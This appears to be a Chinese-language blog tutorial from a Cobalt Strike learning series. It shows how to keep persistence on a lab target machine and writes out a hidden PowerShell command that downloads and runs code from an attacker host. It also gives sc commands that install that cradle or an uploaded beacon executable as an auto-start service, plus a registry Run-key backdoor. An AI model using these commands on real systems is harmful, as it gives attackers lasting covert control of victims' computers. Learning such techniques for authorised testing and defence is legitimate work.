---
title: CobaltStrike学习五
mathjax: true
copyright: true
comment: true
date: 2019-10-16 19:34:22
tags: CobaltStrike
categories: 工具使用
---
在渗透过程中拿到目标权限只是开始，如果管理员修复了漏洞权限就丢失了，这时候要想持续在内网进行渗透就需要权限维持。了解cs的权限维持的手段，熟悉win下注册表、开机启动项以及各种渗透中常见的命令。


<!-- more -->

---
```
1.注册表
2.启动项
3.计时任务
4.设置服务
5.shift后门
6.dll劫持(白加黑)
7.利用其他安装的软件
```
## 设置powershell脚本开机自启动后门
点击Attacks->web driver-by ->script web delivery
![](https://raw.githubusercontent.com/alpha302/cloudimg/master/%7DI%40FX2R7%7DWHI.png)

点击launch后出现如下
将其复制到靶机的cmd运行即可
![](https://raw.githubusercontent.com/alpha302/cloudimg/master/NJHB%7B%607%7D4%60XM8L%5B%60NIE0V.png)

```shell
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.1.1.100:81/a'))"
```
此时拿到了普通用户权限的beacon，首先提权到system权限
![](https://raw.githubusercontent.com/alpha302/cloudimg/master/5%603KM2TO1C%7D%7EQRV%7B8174.png)

![](https://raw.githubusercontent.com/alpha302/cloudimg/master/E6137CE.png)

打开beacon shell后输入：
```
shell sc create "name" binpath= "cmd /c start powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://10.1.1.100:81/a'))\""

```
![](https://raw.githubusercontent.com/alpha302/cloudimg/master/%602%5BPYJY%7B_MZN%5B%7EZ9M%60BBE.png)

切换到靶机，查看服务，
在服务中找到了名为name的项
![](https://raw.githubusercontent.com/alpha302/cloudimg/master/EPPCW8AG%40AZT5.png)

注意到此时启动类型还是手动，我们设置为自动
回到beacon shell输入以下命令即可
```
shell sc config "name" start= auto
```
![](https://raw.githubusercontent.com/alpha302/cloudimg/master/%7B%256FN54XMS_B1GJ%7BSQFP9Q5.png)

在服务中右键-》刷新
![](https://raw.githubusercontent.com/alpha302/cloudimg/master/L%7ERK9V%24I_%7BO7%7E%7BZ%7EB2WE%24GI.png)

设置服务的描述字符串
shell sc description "name" "description"

![](https://raw.githubusercontent.com/alpha302/cloudimg/master/NQHR0%7BQO5%40T.png)

再次刷新，可以看到此时在name的属性中看到了描述为description
![](https://raw.githubusercontent.com/alpha302/cloudimg/master/4%7BOPA%25%7D%409PR09%5B4MH%5BVPQS7.png)

接下来启动服务

shell net start "name"

![](https://raw.githubusercontent.com/alpha302/cloudimg/master/H_%4019B%7E2%24U%5D61LJ%5DS3RBQ%25I.png)

然后重启靶机
此时看到已有的会话已经失去了连接
![](https://raw.githubusercontent.com/alpha302/cloudimg/master/RA3JHISUG%5BM6FMGFIK%7ESX%7BS.png)

不过通过powershell留开机自启动服务，当目标主机重启电脑之后,不断向攻击机器发送请求数据包，重新拿到控制权限

![](https://raw.githubusercontent.com/alpha302/cloudimg/master/FWCQIBD6N%24FLE.png)


## 通过service留自启动后门，生成一个exe后门
Attacks->packages->windows executable

![](https://raw.githubusercontent.com/alpha302/cloudimg/master/_219%7D3LE410%5B8K06A8KL389.png)

保存即可,
然后右键explore>file browser

![](https://raw.githubusercontent.com/alpha302/cloudimg/master/K2%40O5Y3MW4BFL1W%60I.png)

把生成的exe程序上传到靶机
选择我们想要的路径，这里以C:\windows为例
![](https://raw.githubusercontent.com/alpha302/cloudimg/master/HJN9OLVEC75MQ_2CH.png)

点击upload，选择artifact.exe
![](https://raw.githubusercontent.com/alpha302/cloudimg/master/4%259GFI7S%7DP%7ER%25AZ%24ZJ.png)


点击打开即可
在靶机上就能看到了

![](https://raw.githubusercontent.com/alpha302/cloudimg/master/headImg.png)

创建项及路径
shell sc create "server power" binpath= "C:\Windows\artifact.exe"

![](https://raw.githubusercontent.com/alpha302/cloudimg/master/headImg2.png)

```
设置服务的描述字符串
shell sc description "server power" "description"

设置服务为自启动
shell sc config "server power" start= auto
```

![](https://raw.githubusercontent.com/alpha302/cloudimg/master/headImg3.png)

然后启动服务
shell net start "server power"

![](https://raw.githubusercontent.com/alpha302/cloudimg/master/headImg4.png)

## 也可以直接向注册表写开机启动项
还是用上一步生成的木马程序
```
shell reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "keyname" /t REG_SZ /d "C:\Windows\artifact.exe" /f
```
![](https://raw.githubusercontent.com/alpha302/cloudimg/master/headImg5.png)


切换到靶机，打开注册表
![](https://raw.githubusercontent.com/alpha302/cloudimg/master/headImg6.png)

![](https://raw.githubusercontent.com/alpha302/cloudimg/master/headImg7.png)

靶机重启之后，在cs同样是自动拿到了控制权限